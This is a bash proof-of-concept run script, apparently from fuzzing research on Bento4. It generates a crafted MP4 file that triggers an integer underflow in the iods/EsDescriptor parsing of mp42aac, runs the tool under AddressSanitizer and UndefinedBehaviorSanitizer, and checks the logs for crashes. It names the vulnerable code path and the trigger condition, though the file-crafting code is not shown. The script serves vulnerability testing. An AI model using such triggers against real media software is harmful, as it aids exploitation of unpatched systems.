#!/bin/bash
# VULN 003 PoC Run Script
# Triggers AP4_EsDescriptor SubStream integer underflow via crafted iods atom

set -e

SCRIPT_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IodsAtom_h"
MP4_FILE="$SCRIPT_DIR/vuln_003.mp4"
RESULT_FILE="$SCRIPT_DIR/vuln_003_result.txt"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"

echo "=== VULN 003 PoC Run ===" | tee "$RESULT_FILE"
echo "Date: $(date)" | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

# Step 1: Generate the PoC file
echo "[1] Generating PoC MP4..." | tee -a "$RESULT_FILE"
python3 "$SCRIPT_DIR/vuln_003_gen.py" 2>&1 | tee -a "$RESULT_FILE"
echo "" | tee -a "$RESULT_FILE"

# Step 2: Run mp42aac with ASAN+UBSAN enabled
echo "[2] Running mp42aac (ASAN+UBSAN build)..." | tee -a "$RESULT_FILE"
ASAN_OPTIONS="abort_on_error=0:log_path=$SCRIPT_DIR/asan_003.log:detect_leaks=0" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=$SCRIPT_DIR/ubsan_003.log" \
  "$BINARY" "$MP4_FILE" /dev/null \
  >> "$RESULT_FILE" 2>&1 || true

echo "" | tee -a "$RESULT_FILE"

# Step 3: Collect ASAN/UBSAN logs
echo "[3] Collecting sanitizer logs..." | tee -a "$RESULT_FILE"
for f in "$SCRIPT_DIR"/asan_003.log.*; do
    if [ -f "$f" ]; then
        echo "--- ASAN log: $f ---" >> "$RESULT_FILE"
        cat "$f" >> "$RESULT_FILE"
        echo "" >> "$RESULT_FILE"
    fi
done

for f in "$SCRIPT_DIR"/ubsan_003.log.*; do
    if [ -f "$f" ]; then
        echo "--- UBSAN log: $f ---" >> "$RESULT_FILE"
        cat "$f" >> "$RESULT_FILE"
        echo "" >> "$RESULT_FILE"
    fi
done

# Step 4: Check result (only check the binary output section, not our printed messages)
echo "[4] Checking for crash indicators in binary output..." | tee -a "$RESULT_FILE"
# Extract only the binary output (after "[2] Running mp42aac" line)
BINARY_OUTPUT=$(sed -n '/\[2\] Running mp42aac/,/\[3\] Collecting/p' "$RESULT_FILE" | grep -v "^\[")
SANITIZER_LOGS="$SCRIPT_DIR/asan_003.log.* $SCRIPT_DIR/ubsan_003.log.*"

CRASH=0
if echo "$BINARY_OUTPUT" | grep -qiE "AddressSanitizer|runtime error|heap-buffer-overflow|stack-buffer-overflow|use-after-free|Sanitizer|SEGFAULT|Segmentation fault"; then
    CRASH=1
fi
for f in "$SCRIPT_DIR"/asan_003.log.* "$SCRIPT_DIR"/ubsan_003.log.*; do
    if [ -f "$f" ] && grep -qiE "AddressSanitizer|runtime error|heap-buffer-overflow|ubsan" "$f"; then
        CRASH=1
    fi
done

if [ "$CRASH" -eq 1 ]; then
    echo "STATUS: VERIFIED_CRASH - sanitizer error detected!" | tee -a "$RESULT_FILE"
else
    echo "STATUS: UNVERIFIED - no sanitizer error in binary output." | tee -a "$RESULT_FILE"
    echo "Note: Integer underflow occurs at code level (2u-3u=0xFFFFFFFF) but" | tee -a "$RESULT_FILE"
    echo "      unsigned underflow is NOT caught by -fsanitize=address,undefined" | tee -a "$RESULT_FILE"
    echo "      (requires -fsanitize=integer or -fsanitize=unsigned-integer-overflow)" | tee -a "$RESULT_FILE"
fi

echo "" | tee -a "$RESULT_FILE"
echo "=== Done ===" | tee -a "$RESULT_FILE"
echo "Full results: $RESULT_FILE"
